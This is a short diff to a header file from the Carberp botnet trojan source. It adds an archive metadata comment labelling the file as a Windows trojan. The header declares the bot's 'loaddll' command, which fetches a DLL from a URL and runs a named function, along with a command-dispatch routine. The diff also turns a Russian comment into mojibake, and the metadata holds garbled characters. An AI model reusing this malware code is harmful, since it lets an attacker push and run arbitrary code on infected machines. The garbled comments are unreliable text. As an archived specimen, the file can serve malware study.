@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #ifndef ComandLoadDLLH
 #define ComandLoadDLLH
 //----------------------------------------------------------------------------
@@ -10,7 +21,7 @@
 #include "Loader.h"
 #include "GetApi.h"
 #include "DllLoader.h"
-//loaddll url funcname parametrs до 4х штук
+//loaddll url funcname parametrs пїЅпїЅ 4пїЅ пїЅпїЅпїЅпїЅ
 	//char gzip_deflate[] = {'g','z','i','p',',','d','e','f','l','a','t','e',0};
 	static char CommandLoadDllConnect[] =  {'l','o','a','d','d','l','l','s',0};
 	bool ExecuteAllCommand(LPVOID Manager, PCHAR Command, PCHAR Args);
